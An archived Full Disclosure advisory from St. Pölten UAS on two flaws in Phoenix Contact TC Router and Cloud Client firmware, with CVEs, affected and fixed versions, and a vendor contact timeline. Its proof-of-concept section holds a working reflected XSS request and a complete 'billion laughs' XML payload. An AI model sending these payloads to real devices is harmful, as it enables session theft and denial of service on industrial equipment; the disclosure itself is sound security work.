---
title: St. Poelten UAS | Multiple Vulnerabilities in Phoenix Contact TC Cloud Client / TC Router / Cloud Client
url: https://seclists.org/fulldisclosure/2023/Aug/12
source: Full Disclosure
date: 2023-08-12
fetch_date: 2025-10-04T12:03:32.689289
---

# St. Poelten UAS | Multiple Vulnerabilities in Phoenix Contact TC Cloud Client / TC Router / Cloud Client

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](11)
[By Date](date.html#12)
[![Next](/images/right-icon-16x16.png)](13)

[![Previous](/images/left-icon-16x16.png)](11)
[By Thread](index.html#12)
[![Next](/images/right-icon-16x16.png)](13)

![](/shared/images/nst-icons.svg#search)

# St. Poelten UAS | Multiple Vulnerabilities in Phoenix Contact TC Cloud Client / TC Router / Cloud Client

---

*From*: Weber Thomas via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Tue, 8 Aug 2023 09:17:06 +0000

---

```
St. Pölten UAS
-------------------------------------------------------------------------------
               title| Multiple Vulnerabilities
             product| Phoenix Contact TC Cloud Client 1002-4G*,
                    | TC Router 3002T-4G, Cloud Client 1101T-TX/TX
  vulnerable version| <2.07.2, <2.07.2, <2.06.10
       fixed version| 2.07.2, 2.07.2, 2.06.10
          CVE number| CVE-2023-3526, CVE-2023-3569
              impact| Medium
            homepage| https://www.phoenixcontact.com/
               found| 2023-05-04
                  by| A. Resanovic, S. Stockinger, T. Etzenberger
                    | This vulnerability was discovery during research at
                    | St. Pölten UAS, supported and coordinated by CyberDanube.
                    |
                    | https://fhstp.ac.at | https://cyberdanube.com
-------------------------------------------------------------------------------

Vendor description
-------------------------------------------------------------------------------
"At Phoenix Contact, our approach is innovative, sustainable, and based on
partnership. This applies to how we deal with employees as well as with our
customers. We are also conscious of our social and environmental responsibility
and we act accordingly. With the vision of the All Electric Society, we also
want to empower our customers to act more sustainably by enabling the
comprehensive electrification, networking, and automation of all sectors of the
economy and infrastructure with our products and solutions."

Source: https://www.phoenixcontact.com/en-us/ueber-uns

Vulnerable versions
-------------------------------------------------------------------------------
TC Router 3002T-4G*        / <2.0.2
TC Cloud Client 1002-4G*   / <2.07.2
Cloud Client 1101T-TX/TX   / <2.06.10

Vulnerability overview
-------------------------------------------------------------------------------
1) Reflected Cross-Site Scripting (XSS) CVE-2023-3526
A reflected cross-site scripting vulnerability can be triggerd in the license
viewer of the device. This can be used to execute malicious code in the context
of a user's browser. Cookies may be also stoled via this way.

2) Excessive Memory Consumption (Billion Laughts Attack) CVE-2023-3569
By abusing the configuration file upload functionality of the device, it is
possible to slow down all other processes.

Proof of Concept
-------------------------------------------------------------------------------
1) Reflected Cross-Site Scripting (XSS) CVE-2023-3526
The reflected cross-site scripting vulnerability can be triggered by using the
following GET request:
https://$IP/cgi-bin/p/license?pkg=netsnmp&txt=15";><script>alert("document.cookie")</script>

2) Excessive Memory Consumption (Billion Laughts Attack) CVE-2023-3569
The following configuration file can be used to exploit the binary
"/usr/bin/xmlconfig", which supportes entity reference nodes:
﻿===============================================================================
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2
"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3
"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4
"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5
"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6
"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7
"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8
"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9
"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
===============================================================================

The vulnerability was manually verified on an emulated device by using the
MEDUSA scalable firmware runtime (https://medusa.cyberdanube.com).

Solution
-------------------------------------------------------------------------------
Update to the latest available firmware version.

Workaround
-------------------------------------------------------------------------------
None.

Recommendation
-------------------------------------------------------------------------------
Phoenix Contact customers are advised to upgrade the firware to the latest
available version.

Contact Timeline
-------------------------------------------------------------------------------
2023-05-16: Contacting vendor via psirt () phoenixcontact com
2023-05-17: Vendor informed internal product team.
2023-05-18: Added responsible disclosure policy from St. Poelten UAS.
2023-05-19: Vendor needs more time to fix the issues.
2023-06-15: Vendor asked for an explaination of the issues as he cannot
            reproduce them; Sent screenshots and more PoCs to the vendor.
            Offered an MS Teams call to clarify the issues.
2023-06-16: Scheduled a call for 2023-06-19.
2023-06-19: Clarified issues and further timeline for the coordination.
            Vendor proposed to release the firmware on 2023-07-13.
2023-07-04: Contact stated that he has to shift the release after July. It
            will be released on 08.08.2023; Confirmed the date.
2023-07-13: Received CVE numbers from vendor.
2023-07-18: Received firmware versions from vendor.
2023-07-23:_Vendor released firmwares.
2023-08-08: Coordinated release of security advisory.

Web: https://www.fhstp.ac.at/
Twitter: https://twitter.com/fh_stpoelten
Mail: mis at fhstp dot ac dot at

EOF T. Weber / @2023

_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](11)
[By Date](date.html#12)
[![Next](/images/right-icon-16x16.png)](13)

[![Previous](/images/left-icon-16x16.png)](11)
[By Thread](index.html#12)
[![Next](/images/right-icon-16x16.png)](13)

### Current thread:

* **St. Poelten UAS | Multiple Vulnerabilities in Phoenix Contact TC Cloud Client / TC Router / Cloud Client** *Weber Thomas via Fulldisclosure (Aug 11)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldiscl...